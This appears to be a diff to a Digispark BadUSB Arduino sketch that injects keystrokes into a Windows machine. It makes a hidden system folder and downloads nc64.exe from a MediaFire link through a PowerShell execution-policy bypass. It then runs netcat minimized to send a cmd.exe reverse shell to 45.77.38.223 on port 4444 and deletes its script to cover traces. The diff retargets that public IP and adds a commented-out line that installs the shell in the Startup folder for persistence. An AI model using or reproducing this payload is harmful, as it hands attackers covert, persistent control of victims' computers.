@@ -17,8 +17,10 @@ void loop() {
   DigiKeyboard.print("cd / & mkdir win & attrib +s +h win & cd /win & echo (wget 'http://download1640.mediafire.com/cynhfn6wc84g/kjflwyvxh42vk0g/nc64.exe' -OutFile a.exe) > b.ps1 & powershell -ExecutionPolicy ByPass -File b.ps1"); //does all the hacky stuff
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2900);
-  DigiKeyboard.print("START /min a.exe 172.16.4.38 4444 -e cmd.exe -d & del b.ps1 & exit"); //even more hacky stuff also dels b.ps1 to leave as little of a trace as possible
+  DigiKeyboard.print("START /min a.exe 45.77.38.223 4444 -e cmd.exe -d & del b.ps1 & exit"); //even more hacky stuff also dels b.ps1 to leave as little of a trace as possible, also adds the scipt to startup
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboard.print("cd C:/Users/%USERPROFILE%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup & echo (cd / & cd win & start /min a.exe 45.77.38.223 4444 -e cmd.exe -d) > start.bat & exit") //uncoment this is you want the script to be moved to startup and remove "& exit" from the prevouse print line
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
   digitalWrite(1, HIGH); //turns on led when script has finished
   for(;;){ /*empty*/ }
 }
